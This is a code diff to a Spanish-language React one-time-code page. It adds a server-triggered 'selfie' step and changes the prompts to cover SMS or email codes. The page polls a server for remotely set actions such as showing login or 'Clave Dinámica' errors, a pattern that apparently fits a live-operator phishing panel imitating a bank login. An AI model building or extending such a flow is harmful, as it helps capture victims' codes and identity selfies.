@@ -8,6 +8,7 @@ type OtpPageProps = {
   initialMode: OtpMode
   onHome: () => void
   onSuccess: () => void
+  onSelfieRequired: () => void
   onErrorLogin: () => void
 }
 
@@ -16,6 +17,7 @@ export function OtpPage({
   initialMode,
   onHome,
   onSuccess,
+  onSelfieRequired,
   onErrorLogin,
 }: OtpPageProps) {
   const [mode, setMode] = useState<OtpMode>(initialMode)
@@ -53,6 +55,11 @@ export function OtpPage({
           return
         }
 
+        if (action === 'selfie') {
+          onSelfieRequired()
+          return
+        }
+
         if (action === 'error-login') {
           onErrorLogin()
           return
@@ -65,7 +72,7 @@ export function OtpPage({
           setErrorMsg(
             action === 'error-dinamica'
               ? 'Clave Dinámica incorrecta. Por favor, verifica e inténtalo de nuevo.'
-              : 'Código SMS incorrecto. Por favor, verifica e inténtalo de nuevo.',
+              : 'Código SMS o correo electrónico incorrecto. Por favor, verifica e inténtalo de nuevo.',
           )
           inputRefs.current[0]?.focus()
           // Acknowledge error on server
@@ -90,7 +97,7 @@ export function OtpPage({
     }, 1000)
 
     return () => window.clearInterval(interval)
-  }, [sessionId, mode, onSuccess, onErrorLogin])
+  }, [sessionId, mode, onSuccess, onSelfieRequired, onErrorLogin])
 
   // Auto-focus first input on mount
   useEffect(() => {
@@ -193,11 +200,11 @@ export function OtpPage({
                 </svg>
               )}
             </div>
-            <h2>{mode === 'dinamica' ? 'Clave Dinámica' : 'Código de Verificación SMS'}</h2>
+            <h2>{mode === 'dinamica' ? 'Clave Dinámica' : 'Código de Verificación SMS o Correo'}</h2>
             <p className="otp-subtitle">
               {mode === 'dinamica'
                 ? 'Ingresa el código de 6 dígitos generado en tu aplicación Sip o llavero de seguridad.'
-                : 'Hemos enviado un código de verificación de 6 dígitos vía SMS a tu número de celular registrado.'}
+                : 'Hemos enviado un código de verificación de 6 dígitos vía SMS o a tu correo electrónico registrado.'}
             </p>
           </div>
 
